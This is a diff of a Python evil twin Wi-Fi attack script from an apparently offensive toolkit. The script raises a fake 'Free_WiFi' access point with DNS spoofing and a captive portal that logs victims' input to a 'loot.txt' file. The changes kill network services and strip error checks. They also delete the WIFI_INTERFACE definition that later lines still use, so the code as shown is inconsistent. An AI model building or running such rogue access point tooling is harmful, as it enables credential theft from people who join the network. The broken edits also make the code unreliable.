@@ -61,11 +61,7 @@ FONT = ImageFont.load_default()
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT_UI = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
 
-RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
-WIFI_INTERFACE = "wlan1" # Hardcoded to wlan1 as per user request for evil twin attacks
-FAKE_AP_SSID = "Free_WiFi"
-FAKE_AP_CHANNEL = "6"
-CAPTIVE_PORTAL_BASE_PATH = os.path.join(RASPYJACK_DIR, "DNSSpoof", "sites")
+CAPTIVE_PORTAL_BASE_PATH = "/root/Raspyjack/DNSSpoof/sites"
 CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "wifi")
 LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt") # Changed to loot.txt
 TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin/"
@@ -330,6 +326,7 @@ def check_dependencies():
     return None
 
 def stop_interfering_services():
+    subprocess.run("pkill wpa_supplicant", shell=True)
     subprocess.run("pkill dnsmasq", shell=True)
     subprocess.run("pkill hostapd", shell=True)
     subprocess.run("pkill php", shell=True)
@@ -378,10 +375,8 @@ def start_attack():
     # No longer using set_raspyjack_interface as WIFI_INTERFACE is hardcoded to wlan1
     # and we are manually configuring it for AP mode.
     
-    draw_message(["Unmanaging NM..."], "yellow")
-    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
-    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
-    time.sleep(1)
+    # Removed nmcli commands as they are not used in working evil twin scripts
+    # and can cause conflicts. Relying on pkill wpa_supplicant and direct iwconfig.
     
     stop_interfering_services()
     hostapd_conf, dnsmasq_conf = create_configs()
@@ -390,9 +385,9 @@ def start_attack():
         os.remove(LOOT_FILE)
 
     try:
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
-        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True, check=True)
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True, check=True)
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True) # Removed check=True
+        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True) # Removed check=True
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True) # Removed check=True
         
         # Enable IP forwarding
         subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
